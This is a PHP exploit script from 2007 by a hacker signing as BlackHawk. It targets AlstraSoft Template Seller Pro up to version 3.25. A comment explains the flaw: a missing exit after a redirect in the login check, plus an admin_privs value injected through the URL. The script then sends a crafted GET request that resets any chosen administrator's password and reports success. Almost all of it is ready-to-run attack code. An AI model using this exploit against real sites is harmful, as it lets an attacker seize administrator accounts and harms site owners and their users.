#!/usr/bin/php -q -d short_open_tag=on
<?
echo "
AlstraSoft Template Seller Pro <= 3.25 Admin Password Change Exploit
by BlackHawk <hawkgotyou@gmail.com> <http://itablackhawk.altervista.org>
Thanks to rgod for the php code and Marty for the Love

";
if ($argc<4) {
echo "Usage: php ".$argv[0]." Host Path ID password
Host:          target server (ip/hostname)
Path:          path of template
ID:            A Valid Admin ID (usally 1 works for the 'admin' nickname)
password:      The PWD you want to set

Example:
php ".$argv[0]." localhost /template/ 1 hawk";

die;
}
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

/*
 ___________________________________________________________________
/       This script is part of the AlstraSoft Exploit Pack:         \
|                                                                   |
|  http://itablackhawk.altervista.org/exploit/alsoft_exploit_pack;  |
|                                                                   |
|            You can find the patches for this bugs at:             |
|                                                                   |
|   http://itablackhawk.altervista.org/download/alsoft_patch.zip    |
|                                                                   |
\________________________.:BlackHawk 2007:._________________________/

*/

/*
VULN EXPLANATION

look at include/main.php, checkLogin function:

function checkLogin()
{
		global $username, $userpassword, $userID,$conn;
		global $user_name, $user_pass, $admin_privs,$designer_privs,$affiliate_privs;

		session_start();
		session_register("session");
		if ($user_name == "" AND $username == "")
		{
			header("Location:index.php");
		}
		elseif ($user_name != "" OR $username != "")
		{
			$sql_user_name = $user_name;
			$md5_pass = md5($user_pass);
						
			$sql = "SELECT * FROM UserDB WHERE user_name='$sql_user_name' and user_password='$md5_pass'";
			$ADODB_FETCH_MODE = ADODB_FETCH_ASSOC;
			$recordSet = $conn->Execute($sql);
			$num = $recordSet->RecordCount();
			if ($num == 1)
			{
				[...]
				session_register("admin_privs");
				[...]
			}
			else
			{
				header("Location:index.php");
			}
		} // end elseif

mmm.. there isn't any exit or die() after header('Location: index.php')..
so the first part of the security can be bypassed..

now look at admin/changeinfo.php:

<?php
include("../include/common.php");
include("../include/main.php");
global $conn,$config;		
checklogin();   
if($admin_privs=='yes')
{
 [...]
}

if you are a legal user, $admin_privs will be the value of $_SESSIN[admin_privs],
but if you aren't logged in this session simply do not exist, and you can inject
the proper value trough the URL..
*/

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$adminID=$argv[3];
$password=$argv[4];


$port=80;
$proxy="";

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

echo "- Changing admin password...\r\n";
$packet="GET ".$p."admin/changeinfo.php?admin_privs=yes&submit=sottometto&userID=$adminID&frompassword=$password HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);

if (!eregi("Info Successfully",$html))
{
echo 'ERROR EXPLOITING - TRY AGAIN\r\n';
exit;
}

echo 'Exploit worked, your new password for the admin user (ID: '.$adminID.') has been changed into: '.$password;

# Coded With BH Fast Generator v0.1
?>